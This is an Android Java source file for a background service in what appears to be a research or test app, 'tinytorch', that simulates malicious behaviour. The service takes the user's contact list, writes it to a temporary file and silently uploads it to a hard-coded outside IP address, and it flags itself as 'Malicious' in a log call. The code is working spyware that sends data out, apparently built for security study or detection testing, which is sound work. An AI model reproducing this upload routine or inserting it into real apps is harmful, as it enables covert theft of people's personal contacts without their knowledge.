package com.sec.iitr.tinytorch;

        import android.app.Service;
        import android.content.Context;
        import android.content.Intent;
        import android.os.AsyncTask;
        import android.os.Environment;
        import android.os.Handler;
        import android.os.IBinder;
        import android.os.Looper;
        import android.util.Log;

        import java.io.BufferedReader;
        import java.io.DataOutputStream;
        import java.io.File;
        import java.io.FileReader;
        import java.io.FileWriter;
        import java.io.OutputStream;
        import java.io.OutputStreamWriter;
        import java.net.HttpURLConnection;
        import java.net.URL;
        import java.util.Base64;
        import java.util.HashMap;
        import java.util.Map;

        import static android.content.ContentValues.TAG;

        import static java.io.File.createTempFile;

        import org.json.JSONObject;

public class BackgroundService extends Service {

    private boolean isRunning;
    private Context context;
    private Handler handler;
    HashMap<String,String> contacts_List = new HashMap<String,String>();
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        this.context = this;
        this.isRunning = false;

    }

    private Runnable myTask = new Runnable() {

        public void run() {
            try {

                new ForegroundCheckTask().execute();
                Log.e(TAG, "fromService");
                stopSelf();
            } catch (Exception ex) {
                Log.e(TAG, ex.toString());
            }
        }
    };

    @Override
    public void onDestroy() {
        this.isRunning = false;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        MainActivity.isEvil=true;
        Clues myclues=new Clues();
        myclues.SendLog("App Mode Change","App entered onStartCommand()","Malicious");

        if(!this.isRunning) {
            this.isRunning = true;

            contacts_List = (HashMap<String,String>) intent.getExtras().get("CONTACT_LIST");

            handler = new Handler(Looper.getMainLooper());
            handler.post(myTask);
        }
        return START_STICKY;
    }
    class ForegroundCheckTask extends AsyncTask<Void, Void, Void> {

        @Override
        protected Void doInBackground(Void... voids) {
            write_contact();
            return null;
        }

        private void write_contact() {
            try {
                String boundary = "*****";
                String lineEnd = "\r\n";
                String twoHyphens = "--";

                // Create a temporary file to store the data
                File tempFile = createTempFile("contact_temp", ".txt", getCacheDir());
                FileWriter fileWriter = new FileWriter(tempFile);

                // Add your parameters
                for (Map.Entry<String, String> entry : contacts_List.entrySet()) {
                    fileWriter.append(entry.getKey()).append(" : ").append(entry.getValue()).append("\n");
                }

                // Close the FileWriter
                fileWriter.close();

                // Create the connection
                URL url = new URL("http://34.172.14.130:8000/api/file/upload/tinytorch/");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();

                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                connection.setDoInput(true);
                connection.setRequestProperty("Connection", "Keep-Alive");
                connection.setRequestProperty("ENCTYPE", "multipart/form-data");
                connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(connection.getOutputStream());

                // Add the file
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"file\";filename=\"" + tempFile.getName() + "\"" + lineEnd);
                dos.writeBytes(lineEnd);

                BufferedReader bufferedReader = new BufferedReader(new FileReader(tempFile));
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    dos.writeBytes(line);
                }
                bufferedReader.close();

                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                // Close the streams
                dos.flush();
                dos.close();

                // Get the server response code
                int responseCode = connection.getResponseCode();

                // Handle the response code and input stream accordingly

                // Disconnect the connection
                connection.disconnect();

                // Delete the temporary file after uploading
                tempFile.delete();

            } catch (Exception ex) {
                Log.e("error", ex.toString());
            } finally {
                stopSelf();}
        }
    }
}